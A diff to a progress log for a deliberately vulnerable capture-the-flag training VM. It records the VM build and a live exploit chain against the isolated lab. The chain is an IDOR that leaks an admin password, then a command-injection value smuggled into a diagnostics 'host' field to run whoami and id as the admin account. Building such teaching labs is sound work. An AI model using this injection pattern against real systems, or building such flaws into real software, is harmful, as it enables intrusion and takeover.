@@ -40,7 +40,7 @@ application works (there is no application yet).
 - [x] Phase 0 — Environment & plan
 - [x] Phase 1 — Skeleton (this commit) — directories, docs, scripts, venv, test framework verified
 - [x] Phase 2 — Application (Flask app, seeded users, IDOR, admin command injection, tests) — verified below
-- [ ] Phase 3 — Linux identity & admin vulnerability (VM build)
+- [x] Phase 3 — Linux identity & admin function (VM build) — verified below
 - [ ] Phase 4 — Flags & story (15 flags, encryption, manifest)
 - [ ] Phase 5 — Privilege escalation
 - [ ] Phase 6 — Documentation (player + instructor)
@@ -92,6 +92,61 @@ produce a real reverse shell as a Linux `admin` OS user — there is no VM
 yet. That wiring (sudoers rule invoking this same code path as the Linux
 `admin` account, plus a documented reverse-shell workflow against the
 isolated lab network) is Phase 3.
+
+## Phase 3 — Linux identity & VM build (DONE, verified)
+
+Built a real, booted VM: Ubuntu Server 24.04 LTS (official cloud image,
+checksum-verified) under QEMU with cloud-init (NoCloud), host-only
+networking (QEMU user-mode NAT, no bridge). Lives in `vm/` — see
+`vm/README.md` and `instructor-material/build-guide.md`.
+
+- Linux accounts created: `john` (console password only, no SSH),
+  `admin` (console password only, no SSH), `ctfbuilder` (instructor-only,
+  SSH key only, used for provisioning). `root` login disabled.
+- Fixed a real bug found during build: Ubuntu's cloud image already has
+  a system group named `admin`; creating a user of the same name without
+  `no_user_group`/`primary_group` collided and silently failed to create
+  the account. Fixed in `vm/cloud-init/user-data.yaml`, then **rebuilt
+  the VM from scratch** with the fix (not patched by hand) to verify the
+  documented build path is actually correct end to end.
+- `forgotten-admin.service` (systemd) runs the Phase 2 Flask app **as the
+  Linux `admin` account** — confirmed via `ps -o user= -C python3` →
+  `admin`.
+- `/home/admin/{README.txt,evidence/,flags/}` laid out per Section 11,
+  mode 750, owned by `admin:admin`.
+
+**Live end-to-end exploit chain run against the actual booted VM** (not
+just pytest against the dev app):
+```
+curl .../login (john)                      → 302 (session cookie)
+curl .../records/1  (john's own record)     → 200, "Handover notes"
+curl .../records/2  (admin's record, IDOR)  → 200, discloses admin web
+                                               password "N3tOps-Diag#7"
+                                               + pointer to /admin/diagnostics
+curl .../admin/diagnostics as john           → 403 (role gate holds)
+curl .../login (admin, disclosed password)   → 302
+curl POST .../admin/diagnostics
+     host="127.0.0.1; whoami > /tmp/fa_live_proof.txt; id >> ..."
+                                               → 200
+ssh ctfbuilder@vm 'cat /tmp/fa_live_proof.txt'
+     → "admin" / "uid=1002(admin) gid=110(admin) groups=110(admin)"
+ssh ctfbuilder@vm 'stat -c "%U:%G" /tmp/fa_live_proof.txt'
+     → admin:admin
+```
+This proves the full Section 9/10 chain for real: IDOR discloses the
+admin credential, the admin-only diagnostics endpoint's command injection
+executes arbitrary commands, and those commands run as the Linux `admin`
+OS account — not root, not the process that handles John's login. Proof
+file was removed afterward (via `sudo rm`, since it's owned by `admin`
+not `ctfbuilder`) — no leftover test artifacts.
+
+- John is confirmed unable to read `/home/admin` (`Permission denied`).
+- `/healthz` reachable only via the host-only forwarded port
+  `127.0.0.1:8080` (QEMU user-mode NAT) — no bridge, no public exposure.
+
+**Not yet true:** no privilege-escalation mechanism exists yet (Phase 5)
+— `admin` currently has no path to `root` at all, which is correct for
+this phase. No flags are placed yet (Phase 4).
 
 ## Outstanding items requiring the project owner
 
